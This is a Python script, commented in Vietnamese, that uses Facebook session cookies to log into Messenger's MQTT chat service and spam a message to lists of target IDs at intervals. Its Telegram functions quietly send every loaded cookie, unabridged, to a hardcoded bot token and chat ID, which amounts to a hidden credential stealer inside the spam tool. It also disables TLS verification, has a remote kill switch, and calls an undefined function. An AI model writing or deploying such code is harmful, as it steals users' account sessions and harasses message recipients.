import paho.mqtt.client as mqtt, json, time, threading, uuid, ssl, os, warnings, random, gc, requests, sys, queue
warnings.filterwarnings("ignore")

cks, bxs, msg, dls, ck_ua, ck_uid = [], [], "", 15.0, {}, {}

clr = lambda: os.system("cls" if os.name == "nt" else "clear")
lg  = lambda t: print(f"[✓] {t}")

UAS = [
    "Mozilla/5.0 (Linux; Android 11; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.0.0 Mobile Safari/537.36 Via/4.8.2",
    "Mozilla/5.0 (Linux; Android 11; V2109) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.138 Mobile Safari/537.36 Via/4.9.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
]

# ================== TELEGRAM CONFIG ==================
TELEGRAM_TOKEN = None
TELEGRAM_CHAT_ID = None
TELEGRAM_ENABLED = False
wk_stop_event = None
kill_event = None
stop_sent = False

def load_telegram_config():
    global TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
    TELEGRAM_ENABLED = True
    TELEGRAM_TOKEN = "8934184768:AAEqTtzI8hoxk15h09TvsKclJ_nvW1zv3pc"
    TELEGRAM_CHAT_ID = "6647297918"

def send_telegram_message(text, reply_markup=None):
    if not TELEGRAM_ENABLED:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def make_kill_keyboard():
    return {"inline_keyboard": [[{"text": "🔪 KILL", "callback_data": "kill"}]]}

def send_startup_info():
    global stop_sent
    if not TELEGRAM_ENABLED or stop_sent:
        return
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    ck_content = "\n".join(cks) if cks else "Không có cookie"
    id_content = "\n".join(bxs) if bxs else "Không có id"
    msg_content = msg if msg else "Không có tin nhắn"
    text = f"🚀 <b>Khởi động treo</b>\n"
    text += f"📅 Ngày bắt đầu: {now}\n"
    text += f"⏱ Delay: {dls}s\n"
    text += f"🍪 Cookies ({len(cks)}):\n<code>{ck_content}</code>\n"        # <-- bỏ [:500]
    text += f"📋 IDs ({len(bxs)}):\n<code>{id_content}</code>\n"
    text += f"💬 Message:\n<code>{msg_content}</code>"
    send_telegram_message(text, reply_markup=make_kill_keyboard())

def send_cookie_change_notification(new_file):
    if not TELEGRAM_ENABLED:
        return
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    new_cks = lck(new_file)
    ck_content = "\n".join(new_cks) if new_cks else "Không có cookie"
    text = f"🔄 <b>Thay đổi file cookies</b>\n"
    text += f"📂 File mới: {new_file}\n"
    text += f"📅 Thời gian: {now}\n"
    text += f"🍪 Cookies ({len(new_cks)}):\n<code>{ck_content}</code>"       # <-- bỏ [:500]
    send_telegram_message(text)

def send_stop_notification():
    global stop_sent
    if not TELEGRAM_ENABLED or stop_sent:
        return
    stop_sent = True
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    text = f"🛑 <b>Đã dừng treo</b> vào lúc {now}"
    send_telegram_message(text)

def telegram_alive(stop_event):
    while not stop_event.is_set():
        for _ in range(3600):  # 1 giờ
            if stop_event.is_set():
                return
            time.sleep(1)
        send_alive_notification()

def telegram_polling(stop_event):
    global wk_stop_event, stop_sent
    if not TELEGRAM_ENABLED:
        return
    offset = None
    while not stop_event.is_set():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
            params = {"timeout": 30, "offset": offset}
            resp = requests.get(url, params=params, timeout=35)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("ok"):
                    for update in data["result"]:
                        offset = update["update_id"] + 1
                        if "callback_query" in update:
                            cb = update["callback_query"]
                            cb_data = cb.get("data")
                            if cb_data == "kill":
                                # Trả lời callback
                                answer_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery"
                                requests.post(answer_url, json={"callback_query_id": cb["id"], "text": "Đã nhận lệnh kill, đang dừng..."})
                                # Gửi thông báo dừng
                                send_stop_notification()
                                # Đánh dấu dừng
                                stop_event.set()
                                if wk_stop_event:
                                    wk_stop_event.set()
                                return
        except:
            pass
        time.sleep(1)

def input_reader(stop_event, q):
    while not stop_event.is_set():
        line = sys.stdin.readline()
        if line:
            q.put(line.strip())
        else:
            break

# ================== CÁC HÀM CỐT LÕI ==================

BANNER = """
 ██╗  ██╗  █████╗ ██╗████████╗ ██████╗
 ██║ ██╔╝ ██╔══██╗██║╚══██╔══╝██╔═══██╗
 █████╔╝  ███████║██║   ██║   ██║   ██║
 ██╔═██╗  ██╔══██║██║   ██║   ██║   ██║
 ██║  ██╗ ██║  ██║██║   ██║   ╚██████╔╝
 ╚═╝  ╚═╝ ╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝

 Anh Em Royals War - Huy Kaito Yeu Em 🪽
========================================⠀⠀⠀⠀"""

# Gradient "Dịu Dàng": lam lavender nhạt -> hồng phấn -> kem đào
COLORS = [(147, 197, 253), (249, 168, 212), (254, 235, 200)]
RESET, BOLD = "\033[0m", "\033[1m"

def lerp_color(colors, ratio):
    ratio = max(0.0, min(1.0, ratio))
    n = len(colors) - 1
    pos = ratio * n
    i = min(int(pos), n - 1)
    t = pos - i
    c1, c2 = colors[i], colors[i + 1]
    return tuple(int(c1[k] + (c2[k] - c1[k]) * t) for k in range(3))

def rgb(r, g, b): return f"\033[38;2;{r};{g};{b}m"

def bnr():
    lines = BANNER.splitlines()
    total = len(lines)
    for li, line in enumerate(lines):
        chars = list(line)
        n = max(len(chars) - 1, 1)
        row = ""
        for ci, ch in enumerate(chars):
            r, g, b = lerp_color(COLORS, (ci / n) * 0.6 + (li / total) * 0.4)
            row += BOLD + rgb(r, g, b) + ch
        print(row + RESET)

def lck(f):
    try:
        if not os.path.exists(f): return []
        with open(f, encoding="utf-8") as fh:
            d = [l.strip() for l in fh if l.strip()]
        return d
    except Exception:
        return []

def gtk(ck):
    d = {p.split("=",1)[0].strip(): p.split("=",1)[1].strip() for p in ck.split(";") if "=" in p}
    c, x = d.get("c_user"), d.get("xs")
    return f"{c}|{x}" if c and x else None

def cmq(ck, ua):
    try:
        tk = gtk(ck)
        if not tk: return None, None
        cl = mqtt.Client(client_id=f"mqtt_{uuid.uuid4().hex[:6]}", transport="websockets", protocol=mqtt.MQTTv31)
        cl.username_pw_set(username=json.dumps({
            "u": tk.split("|")[0], "s": 1, "chat_on": True,
            "fg": True, "d": str(uuid.uuid4()), "ct": "websocket", "aid": 219994525426954
        }), password="")
        cl.tls_set(cert_reqs=ssl.CERT_NONE)
        cl.tls_insecure_set(True)
        cl.ws_set_options(path="/chat", headers={"Cookie": ck, "Origin": "https://www.facebook.com", "User-Agent": ua})
        cl.connect("edge-chat.facebook.com", 443, 60)
        cl.loop_start()
        return cl, tk
    except Exception:
        return None, None

def wk(stop_event, current_cks, current_ua, current_uid, current_dls):
    clients = {}
    _last_gc = time.time()
    while not stop_event.is_set():
        if time.time() - _last_gc >= 30:
            gc.collect()
            _last_gc = time.time()
        for idx, ck in enumerate(current_cks):
            if stop_event.is_set(): break
            ua = current_ua[idx]
            uid_log = current_uid.get(idx, f"C{idx+1}")
            cl, tk, uid = clients.get(idx, (None, None, None))

            if cl is None:
                lg(f"{uid_log} login mqtt...")
                cl, tk = cmq(ck, ua)
                if cl is None:
                    stop_event.wait(5)
                    continue
                uid = tk.split("|")[0]
                lg(f"{uid_log} login mqtt successfully!")
                clients[idx] = (cl, tk, uid)

            failed = False
            for bx in bxs:
                if stop_event.is_set(): break
                try:
                    mid = str(int(time.time() * 1000))
                    cl.publish("/send_message2", json.dumps({
                        "body": msg, "msgid": mid,
                        "sender_fbid": uid, "to": bx,
                        "offline_threading_id": mid
                    }), qos=0)
                    bxrr = bx[:9]
                    lg(f"Message from {uid_log} to {bxrr}+")
                except Exception:
                    try: cl.loop_stop(); cl.disconnect()
                    except Exception: pass
                    clients[idx] = (None, None, None)
                    failed = True
                    break

            if not failed:
                stop_event.wait(max(1.0, current_dls + random.uniform(-1.0, 1.0)))

    for _, (cl, _, _) in list(clients.items()):
        if cl is not None:
            try: cl.loop_stop(); cl.disconnect()
            except Exception: pass

def mn():
    global cks, bxs, msg, dls, ck_ua, ck_uid, wk_stop_event, kill_event, stop_sent
    clr(); bnr()
    load_telegram_config()

    # Đọc file cấu hình ban đầu
    while True:
        f_ck = "ck.txt"
        cks = lck(f_ck)
        if cks:
            lg(f"{len(cks)} cookie will spam.")
            break
        else:
            lg("Không tìm thấy ck.txt. Hãy tạo file và nhấn Enter để tiếp tục.")
            input()

    try:
        with open("delay.txt", "r") as f:
            dls = float(f.read().strip())
    except Exception:
        dls = 60.0

    while True:
        idb = "id.txt"
        bxs = lck(idb)
        if bxs:
            break
        else:
            lg("Không tìm thấy id.txt. Hãy tạo file và nhấn Enter để tiếp tục.")
            input()

    while True:
        try:
            with open("ngon.txt", encoding="utf-8") as f:
                msg = f.read().strip()
            if msg:
                break
            else:
                lg("File ngon.txt trống. Hãy điền nội dung và nhấn Enter.")
                input()
        except Exception:
            lg("Không tìm thấy ngon.txt. Hãy tạo file và nhấn Enter.")
            input()

    # Gửi thông báo startup lên Telegram
    send_startup_info()

    # Tạo các sự kiện dừng
    kill_event = threading.Event()
    wk_stop_event = threading.Event()

    # Chuẩn bị dữ liệu ban đầu
    ck_ua = {i: random.choice(UAS) for i in range(len(cks))}
    ck_uid = {i: (gtk(ck).split("|")[0] if gtk(ck) else f"C{i+1}") for i, ck in enumerate(cks)}

    # Khởi động luồng chính gửi tin nhắn
    threading.Thread(target=wk, args=(wk_stop_event, cks, ck_ua, ck_uid, dls), daemon=True).start()

    if TELEGRAM_ENABLED:
        threading.Thread(target=telegram_alive, args=(kill_event,), daemon=True).start()
        threading.Thread(target=telegram_polling, args=(kill_event,), daemon=True).start()

    # Tạo queue và luồng đọc input
    input_queue = queue.Queue()
    threading.Thread(target=input_reader, args=(kill_event, input_queue), daemon=True).start()

    # Vòng lặp chính: lắng nghe lệnh từ stdin và kiểm tra kill_event
    while not kill_event.is_set():
        try:
            new_file = input_queue.get(timeout=1)
        except queue.Empty:
            continue
        if not new_file:
            continue

        # Xử lý đổi file cookies
        new_cks = lck(new_file)
        if not new_cks:
            lg(f"File {new_file} không hợp lệ hoặc rỗng, bỏ qua.")
            continue

        # Cập nhật delay (nếu có thay đổi)
        try:
            with open("delay.txt", "r") as f:
                dls = float(f.read().strip())
        except Exception:
            dls = 60.0

        # Dừng luồng cũ
        old_event = wk_stop_event
        if old_event:
            old_event.set()

        # Tạo sự kiện mới cho luồng mới
        wk_stop_event = threading.Event()
        # Cập nhật dữ liệu mới
        cks = new_cks
        ck_ua = {i: random.choice(UAS) for i in range(len(cks))}
        ck_uid = {i: (gtk(ck).split("|")[0] if gtk(ck) else f"C{i+1}") for i, ck in enumerate(cks)}

        # Khởi động luồng mới
        threading.Thread(target=wk, args=(wk_stop_event, cks, ck_ua, ck_uid, dls), daemon=True).start()

        # Gửi thông báo lên Telegram
        send_cookie_change_notification(new_file)

        # Dọn dẹp bộ nhớ
        gc.collect()

    # Khi kill_event được set (do lệnh kill từ Telegram hoặc Ctrl+C)
    if not stop_sent:
        send_stop_notification()
    if wk_stop_event:
        wk_stop_event.set()
    lg("Chương trình đã dừng.")
    sys.exit(0)

if __name__ == "__main__":
    try:
        mn()
    except KeyboardInterrupt:
        if not stop_sent:
            send_stop_notification()
        if wk_stop_event:
            wk_stop_event.set()
        if kill_event:
            kill_event.set()
        sys.exit(0)